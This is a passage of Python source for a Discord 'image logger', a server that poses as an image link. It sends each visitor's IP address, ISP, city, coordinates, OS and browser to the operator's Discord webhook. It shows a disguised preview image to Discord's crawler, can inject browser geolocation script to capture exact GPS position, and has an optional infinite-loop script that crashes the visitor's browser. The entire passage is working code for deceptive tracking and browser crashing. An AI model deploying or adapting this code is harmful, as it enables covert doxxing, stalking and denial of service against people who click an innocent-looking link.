> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
